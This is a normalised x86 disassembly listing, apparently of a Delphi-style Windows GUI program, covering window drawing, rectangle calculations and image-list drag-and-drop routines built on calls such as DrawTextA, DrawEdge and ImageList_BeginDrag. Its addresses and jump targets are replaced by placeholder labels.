push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_451920
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call [ rw-data ]
sub_44e8b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44e8dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_416f14
mov eax esi
call sub_448a78
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
mov eax [ esi + 0x208 ]
call sub_424b20
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_44e938
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_416f14
call sub_43af70
call sub_43b050
test al al
jne r-xdata
call sub_43af70
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_43b43c
push esp
push 0x1
push 0xf
push 0x0
call sub_43af70
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_43b0c0
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_44e9a4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44b090
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_44e9c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44ea08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44eac8
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464f10
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4299c0
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464f10
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4299c0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_44ead4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45394c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_453a88
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44eb34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_45394c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_44ea08
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_44eb94
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_44ead4
push 0x0
call ShowCursor
sub_44eb94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_45394c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_44ebf8
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44e9c8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_44ebf8
push ebx
mov ebx eax
mov eax ebx
call sub_45394c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_44ec1c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45394c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_44e9c8
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44ec90
push ebx
push esi
mov esi eax
mov eax esi
call sub_45394c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_44ebf8
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_44eb1c
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_44ecd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_448d80
mov dl 0x1
mov eax [ r-xdata ]
call sub_424234
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_445340
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_44ed34
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_448ea4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_44ed84
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_42482c
xor eax eax
push ebp
push sub_44ee22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_424ba0
xor eax eax
push ebp
push sub_44edff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_445358
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ee06
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_424ba0
retn
sub_44ee34
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44eec8
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_44ee50
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_44eec8
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_44f4c0
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_44eec8
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_44eefc
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_44ef8c
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
mov edx 0x2
call sub_44ef8c
jmp r-xdata
retn
sub_44ef44
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_44eff8
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
mov edx 0x2
call sub_44eff8
jmp r-xdata
retn
sub_44ef8c
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_44f3c0
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_44eff8
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_44eeac
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_44f3c0
push eax
mov eax esi
call sub_44eefc
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_44f3c0
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_44f0a8
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44eeac
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_44f4c0
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_44eff8
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_44eeac
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_44eff8
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_44eefc
mov edx eax
add edx esi
mov eax ebx
call sub_44f3e8
mov edx edi
mov eax ebx
call sub_44f3e8
jmp r-xdata
mov eax ebx
call sub_44f248
mov eax ebx
call sub_44f498
mov ebx eax
test ebx ebx
jne r-xdata
sub_44f150
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403fe8
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_40403c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
sub_44f194
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_40346c
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_44f205
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_447458
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_44f218
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_44f498
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_44f248
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_44eff8
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44eff8
mov esi eax
push ebp
call sub_44f218
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f498
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44ef8c
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_44ef8c
mov ecx ebx
pop edx
call sub_416f3c
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_446124
mov eax [ ebp - 0x4 ]
call sub_44f3c0
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_44f3c0
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f3c0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_44f3c0
push ebx
mov ebx eax
mov eax ebx
call sub_44eec8
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_44ee50
test al al
je r-xdata
mov eax ebx
call sub_44eefc
pop ebx
retn
sub_44f3fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f3e8
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44ee98
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_44f3ec
mov edx esi
call sub_44f3fc
sub_44f438
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44f3c0
mov edi eax
mov eax ebx
call sub_44eefc
cmp edi eax
jl r-xdata
mov eax esi
call sub_44f0a8
mov eax [ esi + 0x1c ]
push eax
push sub_450f48
mov edx esi
call sub_44f774
mov eax ebx
call sub_44f3c0
mov edi eax
mov eax esi
call sub_44ef44
cmp edi eax
jle r-xdata
mov eax ebx
call sub_44f438
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_44f4a4
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44eec8
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_44f4cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403240
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4035bc
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ee74
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423f3c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_4293e4
mov edx eax
mov eax ebx
call sub_4240b8
mov eax [ ebp - 0x4 ]
call sub_44f69c
xor eax eax
push ebp
push sub_44f5d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_449d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_44f0a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f5df
mov eax [ ebp - 0x4 ]
call sub_44f6a0
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_449d48
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44f5df
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_451470
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_44f634
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_4506a0
mov eax [ esi + 0x10 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_44f6b4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_44f6b4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_44f6b4
pop ecx
sub_44f70c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_44f6b4
pop ecx
sub_44f738
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44f738
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44f738
pop ecx
sub_44f78c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_44f70c
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_44eff8
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_44eff8
push eax
mov edx 0x1
mov eax ebx
call sub_44ef8c
push eax
mov edx 0x2
mov eax ebx
call sub_44ef8c
pop edx
pop ecx
call sub_416f3c
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402c84
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44f810
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_44f248
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_416f3c
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_446124
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ee74
